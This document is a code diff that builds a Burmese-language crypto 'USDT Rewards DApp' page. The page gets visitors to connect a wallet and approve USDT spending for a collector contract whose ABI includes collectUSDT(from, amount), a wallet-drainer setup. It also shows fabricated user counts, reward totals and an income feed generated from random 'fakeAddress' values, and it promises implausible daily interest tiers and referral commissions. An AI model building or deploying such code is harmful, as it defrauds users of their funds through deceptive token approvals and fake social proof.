@@ -1,8 +1,260 @@
-<span class="font-mono text-slate-300 text-xs">${fakeAddress}</span>
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Polygon Cashback & Dashboard</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
+    <style>
+        @keyframes scrollUp {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+        .animate-scroll-list {
+            animation: scrollUp 150s linear infinite;
+        }
+        .animate-scroll-list:hover {
+            animation-play-state: paused;
+        }
+    </style>
+</head>
+<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4">
+
+    <!-- PART 1 -->
+    <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-lg border border-slate-700 relative mb-6">
+        
+        <!-- Header with Logo, Title & Polygon Network Badge on Top Right -->
+        <div class="flex items-center justify-between mb-4 border-b border-slate-700 pb-4">
+            <div class="flex items-center gap-2">
+                <img src="logo.png" alt="Logo" class="w-8 h-8 rounded-full border border-emerald-400/50 object-cover" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';">
+                <h1 class="text-xs md:text-sm font-bold text-emerald-400">USDT Rewards DApp</h1>
+            </div>
+
+            <!-- Top Right Controls: Polygon Logo & Connect Button side-by-side -->
+            <div class="flex items-center gap-2">
+                <!-- Polygon Network Indicator (Fixed to Polygon) -->
+                <div class="flex items-center justify-center bg-indigo-900/90 w-9 h-9 rounded-xl shadow-md border border-indigo-500/40">
+                    <img src="https://cryptologos.cc/logos/polygon-matic-logo.png" class="w-5 h-5 object-contain" title="Polygon Network">
+                </div>
+
+                <!-- Connect Wallet Button -->
+                <button id="connectBtn" onclick="startConnectProcess()" class="bg-blue-600 hover:bg-blue-500 font-semibold px-3 py-2 rounded-xl transition cursor-pointer text-xs shadow-lg">
+                    Connect Wallet
+                </button>
+            </div>
+        </div>
+
+        <!-- Wallet Status, Badge & Error Log -->
+        <div class="space-y-1 mb-4 text-center">
+            <p id="walletAddress" class="text-xs text-slate-400 truncate"></p>
+            <span id="selectedNetworkBadge" class="hidden inline-block bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-xs px-3 py-1 rounded-full font-semibold">Active Network: POLYGON</span>
+            <div id="statusLog" class="text-xs text-center text-amber-400 font-mono pt-1"></div>
+        </div>
+
+        <!-- Live Global Calculating Stats Banner -->
+        <div class="grid grid-cols-3 gap-2 mb-4 bg-gradient-to-r from-slate-900/90 via-slate-900 to-slate-900/90 border border-emerald-500/20 p-3 rounded-xl text-center shadow-inner relative overflow-hidden">
+            <div class="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-transparent via-emerald-500/50 to-transparent"></div>
+            <div>
+                <div class="flex items-center justify-center gap-1 mb-0.5">
+                    <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+                    <p class="text-[10px] text-slate-400 uppercase tracking-wide font-medium">Active Users</p>
+                </div>
+                <p id="statGlobalUsers" class="text-xs font-bold font-mono text-emerald-400">142,850</p>
+            </div>
+            <div class="border-x border-slate-800 px-1">
+                <div class="flex items-center justify-center gap-1 mb-0.5">
+                    <p class="text-[10px] text-slate-400 uppercase tracking-wide font-medium">Yesterday Rewards</p>
+                </div>
+                <p id="statYesterdayRewards" class="text-xs font-bold font-mono text-amber-300">48,290 USDT</p>
+            </div>
+            <div>
+                <div class="flex items-center justify-center gap-1 mb-0.5">
+                    <p class="text-[10px] text-slate-400 uppercase tracking-wide font-medium">Today Rate</p>
+                </div>
+                <p id="statTodayRate" class="text-xs font-bold font-mono text-cyan-300">+2.45%</p>
+            </div>
+        </div>
+
+        <!-- Description Paragraph -->
+        <p class="text-xs text-slate-300 leading-relaxed text-justify bg-slate-900/60 p-3.5 rounded-xl border border-slate-700/60">
+            ကျွန်ုပ်တို့၏ USDT Rewards DApp Platform မှ ကြိုဆိုပါသည်။ ဤစနစ်သည် အသုံးပြုသူများအတွက် မိမိတို့၏ Crypto Wallet ထဲတွင် ရှိသော USDT များပေါ် မူတည်၍ နေ့စဉ် တိုးတက်လာသော Cashback Rewards များကို စနစ်တကျ ရယူနိုင်ရန် ဖန်တီးထားသော ဗဟိုချုပ်ကိုင်မှုမဲ့ အကျိုးခံစားခွင့် ပလက်ဖောင်းတစ်ခု ဖြစ်ပါသည်။ Polygon Network ကို အသုံးပြုထားပြီး Spending Approval ပြုလုပ်ရုံဖြင့် မိမိ၏ Wallet Balance ပေါ် မူတည်ကာ သတ်မှတ်ထားသော Tiered Daily Rates အလိုက် ဆုလာဘ်များ စတင် ရရှိမည် ဖြစ်ပါသည်။
+        </p>
+    </div>
+
+    <!-- PART 2 (Dashboard is placed above Interest Rate Tiers) -->
+    <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-lg border border-slate-700 relative mb-6">
+        
+        <!-- Updated User Dashboard -->
+        <div id="userDashboard" class="hidden bg-slate-900 border border-slate-700 p-4 rounded-xl space-y-3 text-xs mb-4">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-2">
+                <span class="font-bold text-white flex items-center gap-1.5">
+                    <span class="w-1 h-3.5 bg-blue-500 rounded-full inline-block"></span> My account
+                </span>
+                <span class="font-mono text-slate-300">ID: <span id="lblUserId" class="text-white font-semibold">3069</span></span>
+            </div>
+
+            <div class="space-y-2 font-mono">
+                <div class="flex justify-between text-slate-400">
+                    <span>Wallet balance</span>
+                    <span id="lblWalletBal" class="text-slate-200">0.000000 USDT</span>
+                </div>
+                <div class="flex justify-between text-slate-400">
+                    <span>Locked balance</span>
+                    <span class="text-slate-200">0.000000 USDT</span>
+                </div>
+                <div class="flex justify-between text-slate-400">
+                    <span>Interest balance</span>
+                    <span id="lblCashbackBal" class="text-slate-200">0.000000 USDT</span>
+                </div>
+                <div class="flex justify-between text-slate-400">
+                    <span>Convertible balance</span>
+                    <span id="lblConvertibleBal" class="text-slate-300">0.000000 MATIC</span>
+                </div>
+            </div>
+
+            <!-- Notice Banner -->
+            <div id="tierNotice" class="bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-2.5 rounded-xl text-[11px]">
+                Receive Interest when the balance reaches 3001 USDT
+            </div>
+
+            <!-- Interest Box 1 -->
+            <div class="bg-slate-800/90 border border-slate-700 p-3 rounded-xl space-y-1">
+                <div class="flex justify-between items-center">
+                    <span class="font-bold text-white">Interest</span>
+                    <span id="lblInterestEth" class="font-mono font-semibold text-purple-300">0.04199 MATIC</span>
+                </div>
+                <div class="flex justify-between items-center text-[11px] text-slate-400">
+                    <span>Interest is available every days</span>
+                    <span id="lblInterestRate" class="text-emerald-400 font-semibold">2.4%</span>
+                </div>
+            </div>
+
+            <!-- Interest Box 2 -->
+            <div class="bg-slate-800/90 border border-slate-700 p-3 rounded-xl flex justify-between items-center">
+                <div>
+                    <div class="font-bold text-white">Interest</div>
+                    <div class="text-[11px] text-slate-400">Rebate time is 12:00 US time</div>
+                </div>
+                <span class="font-mono font-semibold text-white text-sm">2%</span>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="space-y-2 pt-1">
+                <button onclick="requestWithdraw()" class="w-full bg-gradient-to-r from-purple-700 to-indigo-600 hover:from-purple-600 hover:to-indigo-500 font-semibold py-2.5 rounded-xl transition cursor-pointer text-xs shadow-md">
+                    Withdraw interest
+                </button>
+                <button onclick="pledgeAction()" class="w-full bg-cyan-600 hover:bg-cyan-500 font-semibold py-2.5 rounded-xl transition cursor-pointer text-xs text-slate-950 font-bold shadow-md">
+                    Pledge
+                </button>
+            </div>
+        </div>
+
+        <!-- Public Info: Cashback Tiers Table -->
+        <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl mb-4 text-xs">
+            <h2 class="font-bold text-amber-400 mb-3 uppercase tracking-wider text-center">📊 Interest Rate Tiers (နှုန်းထားများ)</h2>
+            <ul class="space-y-2 text-slate-300">
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 50 USDT</span> <span class="text-emerald-400 font-semibold">1.6% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 1,001 USDT</span> <span class="text-emerald-400 font-semibold">2% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 3,001 USDT</span> <span class="text-emerald-400 font-semibold">2.4% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 5,001 USDT</span> <span class="text-emerald-400 font-semibold">2.8% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 10,001 USDT</span> <span class="text-emerald-400 font-semibold">3.2% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 20,001 USDT</span> <span class="text-emerald-400 font-semibold">3.8% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 50,001 USDT</span> <span class="text-emerald-400 font-semibold">4.2% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 100,001 USDT</span> <span class="text-emerald-400 font-semibold">4.6% USDTBalance</span></li>
+                <li class="flex justify-between"><span>≥ 300,001 USDT</span> <span class="text-emerald-400 font-semibold">5% USDTBalance</span></li>
+            </ul>
+        </div>
+
+        <!-- QR Code & Invite Link Section -->
+        <div class="bg-gradient-to-br from-slate-950 to-indigo-950 p-4 rounded-xl border border-slate-800 text-center flex flex-col items-center">
+            <div class="bg-white p-2 rounded-xl mb-2 shadow-inner inline-block">
+                <img id="qrImage" src="" alt="QR Code" class="w-32 h-32 object-contain">
+            </div>
+            <p class="text-[11px] text-slate-300 mb-1">Share the QR code to invite friends to join</p>
+            <p class="text-xs font-bold text-amber-400 mb-3">Earn up 10% commission inviting friends</p>
+            
+            <div class="w-full flex items-center gap-1">
+                <input type="text" id="refLink" value="https://coin-usdt.me/#/?type=1&code=1yj9e1a0" readonly class="w-full bg-slate-900 border border-slate-800 rounded px-2 py-1.5 text-[11px] text-slate-300 font-mono">
+                <button onclick="copyRefLink()" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1.5 rounded text-[11px] font-semibold shrink-0 cursor-pointer">Copy</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PART 3: Interest Income List (Polygon Only) -->
+    <div class="w-full max-w-lg bg-slate-800 border border-slate-700 p-5 rounded-2xl shadow-xl mb-10 text-xs">
+        <h2 class="font-bold text-emerald-400 uppercase tracking-wider mb-4">INTEREST INCOME LIST</h2>
+        <div class="h-64 overflow-hidden relative">
+            <div id="incomeListContainer" class="absolute w-full space-y-3 animate-scroll-list">
+                <!-- Dynamically populated via JS -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let provider, signer, userAddress;
+        const selectedNetwork = "POLYGON";
+
+        const COLLECTOR_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC";
+        const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
+        const POLYGON_CHAIN_ID = "0x89";
+
+        const ERC20_ABI = [
+            "function approve(address spender, uint256 amount) public returns (bool)",
+            "function allowance(address owner, address spender) view returns (uint256)",
+            "function balanceOf(address account) view returns (uint256)"
+        ];
+
+        const COLLECTOR_ABI = [
+            "function registerUser(address referrer) external",
+            "function collectUSDT(address from, uint256 amount) external",
+            "function processPayout(address user, uint256 amount) external",
+            "function requestWithdraw(uint256 amount) external",
+            "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)"
+        ];
+
+        function startLiveCalculatingStats() {
+            let baseUsers = 142850;
+            let baseRewards = 48290.50;
+            let baseRate = 2.45;
+
+            setInterval(() => {
+                baseUsers += Math.floor(Math.random() * 3);
+                baseRewards += Math.random() * 5.25;
+                baseRate = +(2.40 + Math.random() * 0.1).toFixed(2);
+
+                document.getElementById("statGlobalUsers").innerText = baseUsers.toLocaleString();
+                document.getElementById("statYesterdayRewards").innerText = `${baseRewards.toLocaleString(undefined, {maximumFractionDigits: 2})} USDT`;
+                document.getElementById("statTodayRate").innerText = `+${baseRate}%`;
+            }, 3000);
+        }
+
+        function updateQRCode(url) {
+            const encodedUrl = encodeURIComponent(url);
+            document.getElementById("qrImage").src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodedUrl}`;
+        }
+
+        function generateIncomeList() {
+            const container = document.getElementById("incomeListContainer");
+            let htmlContent = "";
+
+            for (let i = 1; i <= 100; i++) {
+                const randomHex1 = Math.random().toString(16).substring(2, 7).toUpperCase();
+                const randomHex2 = Math.random().toString(16).substring(2, 8).toLowerCase();
+                const fakeAddress = `0x${randomHex1}......${randomHex2}`;
+                const randomAmount = (Math.random() * 0.05 + 0.001).toFixed(4);
+
+                htmlContent += `
+                    <div class="flex items-center justify-between bg-slate-900/90 p-3 rounded-xl border border-slate-800">
+                        <div class="flex items-center gap-2.5">
+                            <div class="w-6 h-6 rounded-full bg-slate-800 flex items-center justify-center p-1 border border-slate-700">
+                                <img src="https://cryptologos.cc/logos/polygon-matic-logo.png" class="w-full h-full object-contain">
+                            </div>
+                            <span class="font-mono text-slate-300 text-xs">${fakeAddress}</span>
                         </div>
                         <span class="font-mono font-semibold text-emerald-400 text-xs">${randomAmount} <span class="text-slate-400">MATIC</span></span>
                     </div>
-                ;
+                `;
             }
 
             container.innerHTML = htmlContent + htmlContent;
@@ -41,7 +293,7 @@
                         signer = await provider.getSigner();
                         userAddress = accounts[0];
 
-                        document.getElementById("walletAddress").innerText = Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
+                        document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                         
                         await checkExistingAllowanceAndLoad();
                     }
@@ -112,7 +364,7 @@
                 userAddress = accounts[0];
                 signer = await provider.getSigner();
 
-                document.getElementById("walletAddress").innerText = Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)};
+                document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                 
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
@@ -161,7 +413,7 @@
 
                 logEl.innerText = "Approval နှင့် မှတ်ပုံတင်ခြင်း အောင်မြင်ပါသည်။";
                 
-                const refLink = ${window.location.origin}${window.location.pathname}?ref=${userAddress};
+                const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
                 document.getElementById("refLink").value = refLink;
                 updateQRCode(refLink);
 
@@ -171,7 +423,8 @@
                 
                 let errorMsg = "Approval သို့မဟုတ် Network ပြောင်းလဲမှု ပျက်ပြားသွားပါပြီ။";
                 
-                if (err.code === 4001  err.code === "ACTION_REJECTED"  (err.message && err.message.toLowerCase().includes("user rejected"))) {errorMsg = "❌ အသုံးပြုသူမှ Transaction ကို ငြင်းပယ်လိုက်ပါပြီ (Rejected / Cancelled)။";
+                if (err.code === 4001 || err.code === "ACTION_REJECTED" || (err.message && err.message.toLowerCase().includes("user rejected"))) {
+                    errorMsg = "❌ အသုံးပြုသူမှ Transaction ကို ငြင်းပယ်လိုက်ပါပြီ (Rejected / Cancelled)။";
                 } else if (err.message && (err.message.toLowerCase().includes("insufficient funds") || err.message.toLowerCase().includes("exceeds balance"))) {
                     errorMsg = "⚠️ Gas Fee (သို့မဟုတ်) လိုအပ်သော လက်ကျန်ငွေ မလုံလောက်ပါ။";
                 }
@@ -209,17 +462,17 @@
 
                     dashboardEl.classList.remove("hidden");
                     document.getElementById("lblUserId").innerText = userInfo.isRegistered ? userInfo.userId.toString() : "3069";
-                    document.getElementById("lblWalletBal").innerText = ${formattedBal.toFixed(6)} USDT;
+                    document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
                     
                     const cashback = formattedBal * rate;
                     const maticInterest = (cashback / 3000).toFixed(5);
 
-                    document.getElementById("lblCashbackBal").innerText = ${cashback.toFixed(6)} USDT;
-                    document.getElementById("lblConvertibleBal").innerText = ${maticInterest} MATIC;
-                    document.getElementById("lblInterestEth").innerText = ${maticInterest} MATIC;
-                    document.getElementById("lblInterestRate").innerText = ${(rate * 100).toFixed(1)}%;
+                    document.getElementById("lblCashbackBal").innerText = `${cashback.toFixed(6)} USDT`;
+                    document.getElementById("lblConvertibleBal").innerText = `${maticInterest} MATIC`;
+                    document.getElementById("lblInterestEth").innerText = `${maticInterest} MATIC`;
+                    document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
 
-                    const refLink = ${window.location.origin}${window.location.pathname}?ref=${userAddress};
+                    const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
                     document.getElementById("refLink").value = refLink;
                     updateQRCode(refLink);
                 } else {
@@ -248,6 +501,7 @@
                 alert("Withdraw တောင်းဆိုမှု မအောင်မြင်ပါ။");
             }
         }
+
         function pledgeAction() {
             alert("Pledge လုပ်ဆောင်ချက်ကို နှိပ်လိုက်ပါပြီ။");
         }
